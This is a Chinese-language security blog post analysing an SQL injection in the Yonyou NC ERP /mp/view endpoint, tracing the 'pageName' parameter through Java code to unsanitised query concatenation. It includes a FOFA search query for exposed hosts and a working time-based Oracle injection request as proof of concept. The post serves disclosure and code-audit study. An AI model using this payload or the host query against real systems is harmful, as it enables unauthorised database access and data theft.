---
title: "用友NC /mp/view sql注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-mp-view-pageName-sqli.html
asset_dir: assets/用友nc-mpview-sql注入漏洞
---

# 用友NC /mp/view sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/15 08:10
* 763浏览
* [0评论](#comment)
* 29分钟阅读

深入探索

身份验证

SQL

企业资源计划


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是用友网络科技股份有限公司研发的一款大型erp企业管理系统与电子商务平台,专为大中型企业提供企业管理解决方案。它集成了财务、供应链、生产、销售、采购、人力资源等多方面的功能，帮助企业实现数字化管理，提升运营效率。用友NC `/mp/view` 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞,未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

编程

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

先看漏洞通告描述

[![用友NC /mp/view sql注入漏洞](images/img-001-304c1959efff.webp)](https://image.mrxn.net/21e772360d944288a82aff35afd38999.webp)

漏洞位置出现在 `MpAction` 的 `view` 方法里

```
public void view() throws PortalServiceException {
        HttpServletRequest req = this.getRequest();
        String systemCode = req.getParameter("pageName");
        if (StringUtils.isBlank(systemCode)) {
            systemCode = "MP";
            LfwLogger.warn("MpAction : param pageName is null, convert to MP ");
        }

        PtCredentialVO credential = this.getCredentialVO((String)null, systemCode);
```

用户可控参数 `pageName` 带入 `getCredentialVO` 方法

```
private PtCredentialVO getCredentialVO(String portletId, String systemCode) throws PortalServiceException {
        Integer sharelevel = 1;
        IUserVO userVO = ((PtSessionBean)LfwRuntimeEnvironment.getLfwSessionBean()).getUser();
        String userId = userVO.getUserid();
        PtCredentialVO credential = PintServiceFactory.getSsoQryService().getCredentials(userId, portletId, systemCode, sharelevel);
```

然后又带入 `getCredentials` 方法，这里需要注意的是有权限检测 `LfwRuntimeEnvironment.getLfwSessionBean(` ，因此这个漏洞需要登录后进行利用。

代码安全审计

```
public PtCredentialVO getCredentials(String userId, String portletId, String className, Integer sharelevel) throws PortalServiceException {
        PtBaseDAO dao = new PtBaseDAO();

        try {
            PtSlotVO[] slots = this.getSlots(userId, portletId, className, sharelevel);
            if (slots != null && slots.length != 0) {
```

跟进 `getSlots` 方法

```
public PtSlotVO[] getSlots(String userId, String portletId, String className, Integer sharelevel) throws PortalServiceException {
        if (sharelevel == null) {
            sharelevel = 1;
        }

        StringBuffer slotWhere = new StringBuffer();
        slotWhere.append(" sharelevel = ");
        slotWhere.append(sharelevel == null ? 1 : sharelevel);
        if (null != sharelevel) {
            if (sharelevel == 0) {
                if (portletId != null && !portletId.trim().equals("")) {
                    slotWhere.append(" and portletid = '" + portletId + "' ");
                }

                if (userId != null && !userId.trim().equals("")) {
                    slotWhere.append(" and userid = '" + userId + "' ");
                }
            } else if (sharelevel == 1) {
                if (className != null && !className.trim().equals("")) {
                    slotWhere.append(" and classname = '" + className + "' ");
                }
```

在上面的 `getCredentialVO` 方法里，`Integer sharelevel = 1;` ，这里判断 `className` 非空且非null 就直接将其拼接在sql语句中了，造成[sql注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

> 漏洞利用示例
>
> 漏洞预警服务

```
POST /portal/pt/mp/view HTTP/1.1
Host: nc65.mrxn.net
Cookie: 你的cookie
Content-Type: application/x-www-form-urlencoded

pageName=1' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE('any',3)--
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC /mp/view sql注入漏洞](https://mrxn.net/jswz/yonyou-nc-mp-view-pageName-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-mp-view-pageName-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALbElEQVR4Aeybi1ojuQ6E8+/7v/OeVItyy7L7AgMkZ8d8iJJKJdlYbRLY2X8ej8e/X7V/y8dn+5Tytg/zuZ85Y84d+dYas27G5Xz2ra0402TuK74G8qxbn+9yAm0gz+k/7lrdPPAAunprak/zQog6CLQW+lg8BAeB4q5Ma8ggauTbILjaw3mhc/KzwVib8/Jdewelt7WBmFj42hMYBgIxfRjxaKt+CnLeHPR9ZhprnXMMe605a2DPQfhHOdfOsNY4zgh9/5y78iFqYcRZ7TCQmWhxv3cC3zoQ2J8Cfwv1qTQvhNDLl0HEEJhrlc+Wc/add2yE6Of8GbpGeKZTDqIvoPBb7FsH8i07+sub/NhAgO2d19n56imUQWjlZ4PggaENsPWHY3SRe8K11jVCCH2tV+6n7McG8lMb/q/3/ZmB/NdP7Qe/v2Egvp4zPNoHxNWe5eE4N9OLg7EGem62P3PqIYO+Rlw11xghaoAq7X7xtd44iD8I52f4IelgGEiXXcGvn0AbCHD5IgmhOdplfgqsMQdR61gIPQd97B5C6WXys0HUAJnefOllwPa9ybdtgvQF7mtcBlEDmGoIbGvCNbaip9MG8vTX5xucwD9+Yr6Cdf+wPw01N4u9JkRd1TgvhGtNrXesehlED8Cp9hSbAAbOOfWQOZ6h8n9i64bMTvWF3OVAYH9iYO7Pnoij7wnGHq6vNbBrz3Kw64AmBdrTDjReztGa5oXSyYBpH2ls0slgrlWuGoQ285cDyeLl//wJDAOBmBoE5i34aTA6B8daa+5g7TuruaNxXdU6FlpzB6XPBvH9wo61j/WZh9BnrvrDQKrgjeK/YitrIG825n8grhEE1v356gmdg9CKywbBw46usc6x0BzsekCpwarWcRbOuJwH2otz5rMPowaCy7rqQ6+BPq56xbP9rhuik3kjGwbiqRlne3UO+qfAvNB1EBoIVM4GI6eca+XboNdac4bQ17iXsNaJq2aNeej7OS+0xiiuWs1B9IMdh4HUJiv+3RMY/nQCMa2zbUBoziZ+Vv8nOYi1IfCsl/cHoxZG7qgXzLXuL4TQQOBRr8yrTpa5dUPyabyB395leS+amMxxRojpKy+DiCFQnM11jo3mhZWD6KPckblmhhD1zrmHY4g87P/K0hrYcxC+66xxDJGHHZ2z9g5C1LtWuG7InZP7Rc0ayC8e9p2l2os6xPVxEfSxeF0pGUROfjZpbOYhtOYhYhixahzPEKI+5+qa0GucF0Lk5Mtyn+orLzMvvxpEP2uMEDzs6NwM1w2ZncoLuWEgEJP0niBiwFT71xfA9qeIlkgOHOeSbHPr0+Z4S5YvcL+vS2GsOVrDvBDGOvcUQuQBhVNTn2pT4Qc5DOSDX/CiEzh82+up5n0B242AwJnG+rPclQaiv3VC9zOKk0FoYUfxVwaht672NS+EXgsRu2aGqqsGUVf5HK8bkk/jDfw2EE8ZrqdorfcP1zVwrXG/M4ToU/dwVnOWg+h3pjnKQdQCTQJsP0Ua8UmnDeSTdUv+Qydw+XuIn8SMEE8BBDo32+NZruqh7wcRA0161q/magxsTy/Q+t1xap8az3qcaYBtH7O6dUNmp/Ln3Jc7rIF8+eh+pnAYiK+aEeJ6AW0HzhmdALarCCNa4xqhOQi94xlCaKBH9bG5rsaVV95cRdj7Owc7B7uvPjYIvtY4FlpbEaIWeAwDeayPl55A+8XQU/NuIKbmWAjBwRzdI6Pqrsx66yD6m89ojRFCCyNaY4Rd4541Z17onFFcNtj7WVMRrjW557oh9QRfHLe3vXf2kSeZ/bParJM/00I8RcrLrIHgAVMNpTuyJvpwrPsINwC217uag+Bh/K+KW+HzC4Tm6bZP96nYBE8H+jro46dkvYboEN7J2msIjNM62ijMtRA8cFS6PZVAh36qIHgXmxdCn7MGggdMDQhs6w2JRGiNail924XjtdwfjjXrNeT2Uf+OcA3kd8759iqHL+q6XrJZJ/GymhNncw7iekKg+YwQOdcaIXggyzvfWmGXeAbA5Y+qp+zyU71ll8KnQDrZ0z38VD4bxD6B9aL+eLOP4UcW7NMCuu0C2xMHPVoEO2/uDvppgah3jfmMzkFoYURrjLm++tbcQYi13CPXQOSgx5nGHITW/YTDQCxe+JoTGAaiKWXL28q8/JyTL84G4/SdM6omm3mI2pyDnrP2DroPRA/Y0TkjjDkIrmocZzzbT9Yd+cNAjoSL/50TOBwI9E9F3g4c56zzk+IYjmugz7kWgof9zxizHITuaC3o89K5j/wjg7FOWtdmFJ8NohZ2tD7rqn84kCpc8e+cQPvTiZeDmKhjT1VYOcdGiFrY0bkZqqfMOYg6xxkhchCYc/YhcuopMy9f5lgIoZUvg4ils4mXOTaKk0HUwH6DIbiqlf6OrRty55R+UfOCgfzid/d/uFQbiK9YRYgrCLRvD9h+QTRRa3IMoTUHEQMuHxDo+kvg+jso/cxybc07B7E20CTAth8IdMI1QnNG6LXiYeQyD6w/nTze7KP9cRHm08v7hdDoiciWNfah10LEzgshOPcSl8280DxEDQSaF8LIibdB5AFTDYHtFmgtW0t+OEf8R3qDqnGccRM+v2TOfvuR9cyvzzc4gcO3vXD8xEDkvH/oY/GeOPQ580LpsonLlnPQ93EOggdMNQS2px4CZ70hci6CiGF/K+vcGULUVQ0ED9RU21tOrBuST+MN/PYakp+e7APDJJ33/mtsXlhzMPaTbmZwrXX/jO6VOfnmM4qXZc4+xPqOjRA87KgeMghOvsw1Qoic/CNbN+ToZF7Er4G86OCPlm0Dgf46QcS6dtUgcm4KEcOOzlXMvZyDvQ5233lhrpMvTgahhx3FyyA4+UcGvUa9ba5xDKF1nNHaM7TeGscQfYH1i+HjzT6Gt7139lcn6zij+0BM3zmIGLCk/X/v1hib4A8dYHtjMmvzmbXOtNCvARG7RgjBQaD3o5yt/chycuFrT2B42+vteGIQ0wSc2p422GMngCHnPtZkPMtJ57xQcTZxR5Z1d333gvF7gODcC/rYvNB95B+ZNTD2WTfk6NRexLeBQEwLepztyxM2WuNYaK6icjbn4HrNO1ro+3gdI+x59/sMQtS7X641B9ca19UaYL3LerzZR3uX5WkZz/YJ8RTA5zH3hajPXPYh8rBjzsuHeznY/1jo71GoHjKIPuJs4mWOjeJkEDWwo3gZ7Bz0vvLZ3FfYfmRlwfJfdwJrIKdn//vJ9ra3Lq3rU82aI955oTXys8F+fc1bazzilT/LKS+rGscZIfaRueqrl6zyMNZKN7NaqxiiHgLF2dYN8Um8CbYXdYhpwX2s30N+QmpuFls/y1UOYl9HPFBTwy+pwMC5yHuBXQO9X7WOM0LUZM6+16jovHDdEJ3CG1kbSJ3aWXy0f4inA3a0dtbPOdj1MPetrZj7nuWkq/kcQ6ybOfuqlTmG+1rXnCFEP2D9Yvh4s492Q7wv2KcFvW/NHdQTlQ36XrDHWXfle23Y66H3rTFC5Ge9rTnLQdRXrWMhhAZ6VM4GkXNszGsPA7Fo4WtOYA3kNed+uOq3DMRXLq8CcT0h0JoZQmigx1m/zFXfvSv/3THEPr2esK4hTlZ5xRD18qt9y0Bq0xV//QS+dSB6Imx3tgT9k1JrIfIw/0ut9UYIvdeGPjYvhMhBoDgZRAwonJrXmyZPSNcZZ9JvHchsgcV97gSGgXh6M/xM61oPtD9bQPhHGvOz9SBqnYOIYbxF1sz6VQ6ij2uERxoILexorREipz42GDnnjMNAnFj4mhNoA4GYHlzjna1C38c1foKEEBrnjBC8NDYIrmocZ4Re6xwED5ga/k1YSzwdYLvVT3f79F5muAnSl5nGXJJtLsQ6wPrTyePNPtoNebN9/bXb+R8AAAD//6fFHMIAAAAGSURBVAMAKQR4m+xqmjQAAAAASUVORK5CYII=)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-mp-view-pageName-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

企业资源规划

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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